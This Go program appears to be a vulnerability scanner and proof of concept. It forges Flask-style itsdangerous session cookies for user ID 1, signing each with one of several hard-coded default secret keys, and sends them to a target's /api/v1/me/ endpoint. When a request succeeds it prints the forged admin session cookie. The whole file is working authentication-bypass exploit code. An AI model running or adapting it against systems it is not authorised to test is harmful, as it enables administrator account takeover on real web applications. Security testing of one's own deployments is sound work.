package main

import (
	"bytes"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"

	"github.com/tardc/itsdangerous"
)

func main() {
	u := flag.String("url", "", "the URL to scan")
	flag.Parse()

	if *u == "" {
		log.Fatalln(errors.New("invalid URL"))
	}
	parsed, err := url.Parse(*u)
	if err != nil {
		log.Fatalln(err)
	}
	parsed.Path = "/api/v1/me/"

	defaultKeys := []string{
		"\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h",
		"CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",
		"thisISaSECRET_1234",
		"YOUR_OWN_RANDOM_GENERATED_SECRET_KEY",
		"TEST_NON_DEV_SECRET",
	}
	salt := "cookie-session"
	defaultAdminSessionValue := map[string]interface{}{"_user_id": 1, "user_id": 1}

	var vulnerable bool
	for _, key := range defaultKeys {
		signer := itsdangerous.NewTimestampSigner(key, salt, ".", "hmac", nil, nil, 0)
		serializer := itsdangerous.URLSafeSerializer{
			RegularSerializer: &itsdangerous.RegularSerializer{
				Marshaller: &itsdangerous.JSONMarshaller{},
				Signer:     signer,
			},
		}

		sessionCookie, err := serializer.Dumps(defaultAdminSessionValue)
		if err != nil {
			log.Println(err)
			continue
		}

		req, err := http.NewRequest(http.MethodGet, parsed.String(), nil)
		if err != nil {
			log.Println(err)
			continue
		}
		req.Header.Set("Cookie", "session="+sessionCookie)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			log.Println(err)
			continue
		}

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Println(err)
			continue
		}
		if resp.StatusCode == 200 &&
			bytes.Contains(body, []byte("result\":")) &&
			bytes.Contains(body, []byte("email\":")) &&
			bytes.Contains(body, []byte("username\":")) {

			fmt.Println("[*] Vulnerable:", parsed.String())
			fmt.Println("[*] session:", sessionCookie)

			vulnerable = true
			break
		}
	}

	if !vulnerable {
		fmt.Println("[-] Secure:", *u)
	}
}
